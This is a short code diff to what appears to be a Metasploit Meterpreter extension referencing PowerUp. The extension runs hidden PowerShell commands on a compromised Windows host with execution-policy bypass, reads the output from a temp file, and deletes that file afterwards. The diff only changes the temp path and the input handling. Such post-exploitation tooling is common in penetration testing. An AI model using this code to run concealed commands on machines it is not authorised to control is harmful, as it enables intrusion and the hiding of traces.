@@ -172,7 +172,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
           print_warning("Output timeout: #{val} seconds")
         rescue
           print_error "#{val} is not a valid Integer."
-          c_time = 10
+          return false
         end
       when '-h'
         print_line(POWER_SHELL_USAGE)
@@ -185,10 +185,10 @@ Ref: https://github.com/HarmJ0y/PowerUp
     end  
     output  = "#{rand(100000)}"
     ps_cmd  = args.join(" ")
-    client.sys.process.execute("powershell -nop -exec bypass -c #{ps_cmd} >> C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
+    client.sys.process.execute("powershell -nop -exec bypass -c #{ps_cmd} >> %%TEMP%%\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
     print_status("Sending command to client...")
     sleep(c_time)
-    log_file = client.fs.file.new("C:\\Windows\\Temp\\#{output}", "rb")
+    log_file = client.fs.file.new("%%TEMP%%\\#{output}", "rb")
     begin
       while ((data = log_file.read) != nil)
         data.strip!
@@ -199,7 +199,7 @@ Ref: https://github.com/HarmJ0y/PowerUp
       log_file.close
     end
 
-    client.sys.process.execute("cmd /c del C:\\Windows\\Temp\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
+    client.sys.process.execute("cmd /c del %%TEMP%%\\#{output}", nil, {'Hidden' => 'true', 'Channelized' => true})
     return true
   end
 
